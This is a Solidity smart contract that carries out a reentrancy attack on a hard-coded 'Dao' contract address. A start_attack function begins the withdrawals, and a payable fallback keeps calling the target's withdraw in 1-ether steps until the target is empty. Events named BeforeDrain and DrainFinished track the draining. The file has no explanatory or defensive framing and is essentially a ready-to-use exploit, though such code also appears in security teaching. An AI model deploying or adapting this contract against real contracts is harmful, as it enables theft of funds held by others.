pragma solidity ^0.4.10;

contract Dao {
   function withdraw(address addr, uint256 amount) returns (bool);
   function fundit(address to) payable;
}

contract Contract {

    event BeforeDrain(uint256 drainToGo);
    event DrainFinished(uint256 myBalance);

    address constant owner = 0x86ab01ddb2be0b5ecdbe9a5095aa407086fafa29;
    Dao constant target = Dao(0x9ec86b8a4fa366bcae7164f27e1c831ce8d0e869);
    uint256 constant drainPerCall = 1000000000000000000;

    function Contract() public payable {
    }

    function get_owner() public constant returns (address) {
        return owner;
    }

    function get_target() public constant returns (address) {
        return address(target);
    }

    function get_balance() public constant returns (uint256) {
        return this.balance;
    }

    function start_attack() public {
        target.withdraw(this, drainPerCall);
    }

    function put_money() public payable {

    }

    function get_money() public {
        msg.sender.call.value(this.balance)();
    }

    function() public payable {
        BeforeDrain(target.balance);
        if (target.balance == 0) {
            DrainFinished(this.balance);
        }
        else if (target.balance >= drainPerCall) {
            target.withdraw(this, drainPerCall);
        }
        else if(target.balance < drainPerCall) {
            target.withdraw(this, target.balance);
        }
     }
}
